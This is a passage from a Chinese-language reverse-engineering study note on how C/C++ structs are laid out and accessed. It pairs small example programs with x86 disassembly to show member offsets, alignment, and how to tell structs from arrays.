class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">B</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">float</span> x;</span><br><span class=\"line\">    <span class=\"type\">float</span> y;</span><br><span class=\"line\">    <span class=\"type\">float</span> z;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">A</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> m_up;</span><br><span class=\"line\">\t<span class=\"type\">char</span> m_Name[<span class=\"number\">32</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> m_Num;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    B zuobiao;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">A aa;</span><br><span class=\"line\"><span class=\"comment\">// aa + 4 //m_up</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">A 通过一级偏移找到B zuobiao</span><br><span class=\"line\">zuobiao通过二级偏移找到xyz</span><br><span class=\"line\">    </span><br><span class=\"line\">结构体在创建时不分配空间</span><br><span class=\"line\">A aa;   此时分配空间</span><br><span class=\"line\">aa.fXpos = <span class=\"number\">2.1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">结构体在定义的时候，除了自身以外，可以存储任何类型</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct AA</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint m;</span><br><span class=\"line\">\tint n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">struct  st</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a;</span><br><span class=\"line\">\tshort b;</span><br><span class=\"line\">\tchar c;</span><br><span class=\"line\">\tint arr[10];</span><br><span class=\"line\">\tAA aa;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">st x;</span><br><span class=\"line\"></span><br><span class=\"line\">void func()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tx.a = 10;</span><br><span class=\"line\">\tx.b = 20;</span><br><span class=\"line\">\tx.c = 30;</span><br><span class=\"line\">\tx.arr[0] = 100;</span><br><span class=\"line\">\tx.aa.m = 22;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void func2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a1  = x.a;</span><br><span class=\"line\">\tint y1 = x.arr[0];</span><br><span class=\"line\">\tint y2 = x.aa.m;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">st func()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tst s;</span><br><span class=\"line\">\ts.a = 1;</span><br><span class=\"line\">\ts.b = 2;</span><br><span class=\"line\">\ts.c = 3;</span><br><span class=\"line\">\treturn s;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>数组和结构体判断</p>\n<p>等宽连续 - 数组</p>\n<p>连续不等宽 - 大概率结构体</p>\n<p>但结构体中都是相同类型的变量也可以逆成数组</p>\n<p>结构体尽量定义为全局变量，减少复制次数，尽量不要当参数和返回值</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 结构体作为全局变量</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">st</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">int</span> a;</span><br><span class=\"line\">\t<span class=\"type\">short</span> b;</span><br><span class=\"line\">\t<span class=\"type\">char</span> c;</span><br><span class=\"line\">\t<span class=\"type\">int</span> arr[<span class=\"number\">10</span>];</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">st x;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tx.a = <span class=\"number\">10</span>;</span><br><span class=\"line\">\tx.b = <span class=\"number\">20</span>;</span><br><span class=\"line\">\tx.c = <span class=\"number\">30</span>;</span><br><span class=\"line\">\tx.arr[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tx.arr[<span class=\"number\">1</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">func2</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a1 = x.a;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b1 = x.b;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c1 = x.c;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tfunc();</span><br><span class=\"line\">\tfunc2();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401030</span> &gt;/&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">00401031</span>  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401033</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">40</span>       sub     esp,<span class=\"number\">0x40</span></span><br><span class=\"line\"><span class=\"number\">00401036</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00401037</span>  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">00401038</span>  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">00401039</span>  |.  <span class=\"number\">8</span>D7D C0       lea     edi,[local<span class=\"number\">.16</span>]</span><br><span class=\"line\"><span class=\"number\">0040103</span>C  |.  B9 <span class=\"number\">10000000</span>   mov     ecx,<span class=\"number\">0x10</span></span><br><span class=\"line\"><span class=\"number\">00401041</span>  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00401046</span>  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00401048</span>  |.  C705 <span class=\"number\">507</span>C4200&gt;mov     dword ptr ds:[<span class=\"number\">0x427C50</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">00401052</span>  |.  <span class=\"number\">66</span>:C705 <span class=\"number\">547</span>C4&gt;mov     word ptr ds:[<span class=\"number\">0x427C54</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">0040105B</span>  |.  C605 <span class=\"number\">567</span>C4200&gt;mov     byte ptr ds:[<span class=\"number\">0x427C56</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">00401062</span>  |.  C705 <span class=\"number\">587</span>C4200&gt;mov     dword ptr ds:[<span class=\"number\">0x427C58</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">0040106</span>C  |.  C705 <span class=\"number\">5</span>C7C4200&gt;mov     dword ptr ds:[<span class=\"number\">0x427C5C</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">00401076</span>  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">00401077</span>  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">00401078</span>  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">00401079</span>  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">0040107B</span>  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">0040107</span>C  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401090</span> &gt;/&gt; \\<span class=\"number\">55</span>            push    ebp</span><br><span class=\"line\"><span class=\"number\">00401091</span>  |.  <span class=\"number\">8B</span>EC          mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401093</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">4</span>C       sub     esp,<span class=\"number\">0x4C</span></span><br><span class=\"line\"><span class=\"number\">00401096</span>  |.  <span class=\"number\">53</span>            push    ebx</span><br><span class=\"line\"><span class=\"number\">00401097</span>  |.  <span class=\"number\">56</span>            push    esi</span><br><span class=\"line\"><span class=\"number\">00401098</span>  |.  <span class=\"number\">57</span>            push    edi</span><br><span class=\"line\"><span class=\"number\">00401099</span>  |.  <span class=\"number\">8</span>D7D B4       lea     edi,[local<span class=\"number\">.19</span>]</span><br><span class=\"line\"><span class=\"number\">0040109</span>C  |.  B9 <span class=\"number\">13000000</span>   mov     ecx,<span class=\"number\">0x13</span></span><br><span class=\"line\"><span class=\"number\">004010</span>A1  |.  B8 CCCCCCCC   mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">004010</span>A6  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">004010</span>A8  |.  A1 <span class=\"number\">507</span>C4200   mov     eax,dword ptr ds:[<span class=\"number\">0x427C50</span>]</span><br><span class=\"line\"><span class=\"number\">004010</span>AD  |.  <span class=\"number\">8945</span> FC       mov     [local<span class=\"number\">.1</span>],eax</span><br><span class=\"line\"><span class=\"number\">004010B</span>0  |.  <span class=\"number\">0F</span>BF0D <span class=\"number\">547</span>C42&gt;movsx   ecx,word ptr ds:[<span class=\"number\">0x427C54</span>]</span><br><span class=\"line\"><span class=\"number\">004010B</span>7  |.  <span class=\"number\">894</span>D F8       mov     [local<span class=\"number\">.2</span>],ecx</span><br><span class=\"line\"><span class=\"number\">004010B</span>A  |.  <span class=\"number\">0F</span>BE15 <span class=\"number\">567</span>C42&gt;movsx   edx,byte ptr ds:[<span class=\"number\">0x427C56</span>]</span><br><span class=\"line\"><span class=\"number\">004010</span>C1  |.  <span class=\"number\">8955</span> F4       mov     [local<span class=\"number\">.3</span>],edx</span><br><span class=\"line\"><span class=\"number\">004010</span>C4  |.  <span class=\"number\">5F</span>            pop     edi</span><br><span class=\"line\"><span class=\"number\">004010</span>C5  |.  <span class=\"number\">5</span>E            pop     esi</span><br><span class=\"line\"><span class=\"number\">004010</span>C6  |.  <span class=\"number\">5B</span>            pop     ebx</span><br><span class=\"line\"><span class=\"number\">004010</span>C7  |.  <span class=\"number\">8B</span>E5          mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">004010</span>C9  |.  <span class=\"number\">5</span>D            pop     ebp</span><br><span class=\"line\"><span class=\"number\">004010</span>CA  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//结构体作为局部变量</span></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">Pointer</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">float</span> x_pos;</span><br><span class=\"line\">\t<span class=\"type\">float</span> y_pos;</span><br><span class=\"line\">\t<span class=\"type\">float</span> z_pos;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">st</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a;</span><br><span class=\"line\">\t<span class=\"type\">short</span> b;</span><br><span class=\"line\">\t<span class=\"type\">char</span> c;</span><br><span class=\"line\">\t<span class=\"type\">int</span> arr[<span class=\"number\">10</span>];</span><br><span class=\"line\">\tPointer p1;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tst x;</span><br><span class=\"line\">\tx.a = <span class=\"number\">10</span>;</span><br><span class=\"line\">\tx.b = <span class=\"number\">20</span>;</span><br><span class=\"line\">\tx.c = <span class=\"number\">30</span>;</span><br><span class=\"line\">\tx.arr[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">\tx.arr[<span class=\"number\">1</span>] = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\tx.p1.x_pos = <span class=\"number\">2.1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">00401020</span> &gt;/&gt; \\<span class=\"number\">55</span>                    push    ebp</span><br><span class=\"line\"><span class=\"number\">00401021</span>  |.  <span class=\"number\">8B</span>EC                  mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401023</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">7</span>C               sub     esp,<span class=\"number\">0x7C</span></span><br><span class=\"line\"><span class=\"number\">00401026</span>  |.  <span class=\"number\">53</span>                    push    ebx</span><br><span class=\"line\"><span class=\"number\">00401027</span>  |.  <span class=\"number\">56</span>                    push    esi</span><br><span class=\"line\"><span class=\"number\">00401028</span>  |.  <span class=\"number\">57</span>                    push    edi</span><br><span class=\"line\"><span class=\"number\">00401029</span>  |.  <span class=\"number\">8</span>D7D <span class=\"number\">84</span>               lea     edi,[local<span class=\"number\">.31</span>]</span><br><span class=\"line\"><span class=\"number\">0040102</span>C  |.  B9 <span class=\"number\">1F</span>000000           mov     ecx,<span class=\"number\">0x1F</span></span><br><span class=\"line\"><span class=\"number\">00401031</span>  |.  B8 CCCCCCCC           mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00401036</span>  |.  F3:AB                 rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00401038</span>  |.  C745 C4 <span class=\"number\">0</span>A000000      mov     dword ptr ss:[ebp<span class=\"number\">-0x3C</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">0040103F</span>  |.  <span class=\"number\">66</span>:C745 C8 <span class=\"number\">1400</span>       mov     word ptr ss:[ebp<span class=\"number\">-0x38</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">00401045</span>  |.  C645 CA <span class=\"number\">1</span>E            mov     byte ptr ss:[ebp<span class=\"number\">-0x36</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">00401049</span>  |.  C745 CC <span class=\"number\">01000000</span>      mov     dword ptr ss:[ebp<span class=\"number\">-0x34</span>],<span class=\"number\">0x1</span></span><br><span class=\"line\"><span class=\"number\">00401050</span>  |.  C745 D0 <span class=\"number\">02000000</span>      mov     dword ptr ss:[ebp<span class=\"number\">-0x30</span>],<span class=\"number\">0x2</span></span><br><span class=\"line\"><span class=\"number\">00401057</span>  |.  C745 F4 <span class=\"number\">66660640</span>      mov     dword ptr ss:[ebp<span class=\"number\">-0xC</span>],<span class=\"number\">0x40066666</span></span><br><span class=\"line\"><span class=\"number\">0040105</span>E  |.  <span class=\"number\">5F</span>                    pop     edi</span><br><span class=\"line\"><span class=\"number\">0040105F</span>  |.  <span class=\"number\">5</span>E                    pop     esi</span><br><span class=\"line\"><span class=\"number\">00401060</span>  |.  <span class=\"number\">5B</span>                    pop     ebx</span><br><span class=\"line\"><span class=\"number\">00401061</span>  |.  <span class=\"number\">8B</span>E5                  mov     esp,ebp</span><br><span class=\"line\"><span class=\"number\">00401063</span>  |.  <span class=\"number\">5</span>D                    pop     ebp</span><br><span class=\"line\"><span class=\"number\">00401064</span>  \\.  C3                    retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//当结构体中变量不等宽时，分空间不再按照本机宽度分</span></span><br><span class=\"line\"><span class=\"comment\">//局部变量int+short+char 还是按照12字节分</span></span><br><span class=\"line\"><span class=\"comment\">//结构体中变量等宽时和局部变量一样</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">struct</span> <span class=\"title class_\">st</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\tst x;</span><br><span class=\"line\">\tx.a = <span class=\"number\">10</span>;</span><br><span class=\"line\">\tx.b = <span class=\"number\">20</span>;</span><br><span class=\"line\">\tx.c = <span class=\"number\">30</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func2</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> a = <span class=\"number\">10</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> b = <span class=\"number\">20</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> c = <span class=\"number\">30</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func3</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> arr[<span class=\"number\">3</span>] = &#123;<span class=\"number\">10</span>,<span class=\"number\">20</span>,<span class=\"number\">30</span>&#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>();</span><br><span class=\"line\">\t<span class=\"built_in\">func2</span>();</span><br><span class=\"line\">    <span class=\"built_in\">func3</span>();</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">func</span><br><span class=\"line\"><span class=\"number\">00401020</span> &gt;/&gt; \\<span class=\"number\">55</span>                   push    ebp</span><br><span class=\"line\"><span class=\"number\">00401021</span>  |.  <span class=\"number\">8B</span>EC                 mov     ebp,esp</span><br><span class=\"line\"><span class=\"number\">00401023</span>  |.  <span class=\"number\">83</span>EC <span class=\"number\">4</span>C              sub     esp,<span class=\"number\">0x4C</span></span><br><span class=\"line\"><span class=\"number\">00401026</span>  |.  <span class=\"number\">53</span>                   push    ebx</span><br><span class=\"line\"><span class=\"number\">00401027</span>  |.  <span class=\"number\">56</span>                   push    esi</span><br><span class=\"line\"><span class=\"number\">00401028</span>  |.  <span class=\"number\">57</span>                   push    edi</span><br><span class=\"line\"><span class=\"number\">00401029</span>  |.  <span class=\"number\">8</span>D7D B4              lea     edi,[local<span class=\"number\">.19</span>]</span><br><span class=\"line\"><span class=\"number\">0040102</span>C  |.  B9 <span class=\"number\">13000000</span>          mov     ecx,<span class=\"number\">0x13</span></span><br><span class=\"line\"><span class=\"number\">00401031</span>  |.  B8 CCCCCCCC          mov     eax,<span class=\"number\">0xCCCCCCCC</span></span><br><span class=\"line\"><span class=\"number\">00401036</span>  |.  F3:AB                rep     stos dword ptr es:[edi]</span><br><span class=\"line\"><span class=\"number\">00401038</span>  |.  C745 F4 <span class=\"number\">0</span>A000000     mov     [local<span class=\"number\">.3</span>],<span class=\"number\">0xA</span></span><br><span class=\"line\"><span class=\"number\">0040103F</span>  |.  C745 F8 <span class=\"number\">14000000</span>     mov     [local<span class=\"number\">.2</span>],<span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">00401046</span>  |.  C745 FC <span class=\"number\">1E000000</span>     mov     [local<span class=\"number\">.1</span>],<span class=\"number\">0x1E</span></span><br><span class=\"line\"><span class=\"number\">0040104</span>D  |.  <span class=\"number\">5F</span>                   pop     edi</span><br><span class=\"line\"><span class=\"number\">0040104</span>E  |.  <span class=\"number\">5</span>E                   pop     esi</span><br><span class=\"line\"><span class=\"number\">0040104F</span>  |.  <span class=\"number\">5B</span>                   pop     ebx</span><br><span class=\"line\"><span class=\"number\">00401050</span>  |.  <span class=\"number\">8B</span>E5                 mov     